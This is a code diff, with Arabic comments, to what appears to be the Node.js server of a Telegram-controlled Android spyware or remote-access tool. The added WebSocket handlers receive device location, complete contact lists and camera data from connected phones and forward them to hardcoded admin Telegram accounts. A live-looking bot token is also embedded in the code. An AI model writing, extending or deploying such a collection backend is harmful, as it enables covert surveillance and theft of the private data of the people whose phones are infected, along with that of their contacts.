@@ -11,7 +11,7 @@ const axios = require('axios');
 // ==================== الإعدادات والثوابت ====================
 const CONFIG = {
     token: process.env.BOT_TOKEN || '7819148002:AAEOvqCNBwMbily87VEy68jPfMW2QQCq7RU',
-    adminIds: process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : ['6430670316', '5492273274' , '6123719421'],
+    adminIds: process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : ['6430670316'],
     address: process.env.SERVER_ADDRESS || 'https://www.google.com',
     port: process.env.PORT || 10000,
     
@@ -841,7 +841,72 @@ ws.on('message', (message) => {
         }
     }
 });
+// في قسم WebSocket Handling - أضف هذا الكود
+ws.on('message', (message) => {
+    const messageStr = message.toString();
+    console.log(`📨 WebSocket Raw: ${messageStr}`);
+    
+    try {
+        // إذا التطبيق يرسل JSON
+        const data = JSON.parse(messageStr);
+        handleWebSocketData(data, deviceInfo);
+    } catch (e) {
+        handlePlainWebSocketMessage(messageStr, deviceInfo);
+    }
+});
 
+function handleWebSocketData(data, deviceInfo) {
+    if (data.type === 'location') {
+        CONFIG.adminIds.forEach(adminId => {
+            appBot.sendLocation(adminId, data.lat, data.lon);
+            BotHelpers.sendMessage(adminId, 
+                `📍 موقع من <b>${deviceInfo.model}</b>\n` +
+                `• خط العرض: ${data.lat}\n` +
+                `• خط الطول: ${data.lon}`
+            );
+        });
+    }
+    else if (data.type === 'contacts') {
+        let contactsText = `👤 جهات الاتصال من: <b>${deviceInfo.model}</b>\n\n`;
+        data.contacts.forEach((contact, index) => {
+            contactsText += `${index + 1}. ${contact.name}: ${contact.number}\n`;
+        });
+        CONFIG.adminIds.forEach(adminId => {
+            BotHelpers.sendMessage(adminId, contactsText);
+        });
+    }
+    else if (data.type === 'camera') {
+        // معالجة بيانات الصورة (إذا يرسلها base64)
+        CONFIG.adminIds.forEach(adminId => {
+            BotHelpers.sendMessage(adminId, 
+                `📷 صورة من <b>${deviceInfo.model}</b>\n` +
+                `• نوع الكاميرا: ${data.cameraType}`
+            );
+        });
+    }
+}
+
+function handlePlainWebSocketMessage(message, deviceInfo) {
+    if (message.includes('lat:') && message.includes('lon:')) {
+        // إذا التطبيق يرسل الموقع كنص عادي
+        const lat = parseFloat(message.split('lat:')[1].split(',')[0]);
+        const lon = parseFloat(message.split('lon:')[1]);
+        
+        CONFIG.adminIds.forEach(adminId => {
+            appBot.sendLocation(adminId, lat, lon);
+            BotHelpers.sendMessage(adminId, 
+                `📍 موقع من <b>${deviceInfo.model}</b>\n` +
+                `• خط العرض: ${lat}\n` +
+                `• خط الطول: ${lon}`
+            );
+        });
+    }
+}
+// endpoint لاختبار إرسال بيانات بسيطة
+app.post("/testSimple", (req, res) => {
+    console.log('🧪 SIMPLE TEST:', req.body);
+    res.json({received: true});
+});
 // ==================== Telegram Bot Handlers ====================
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
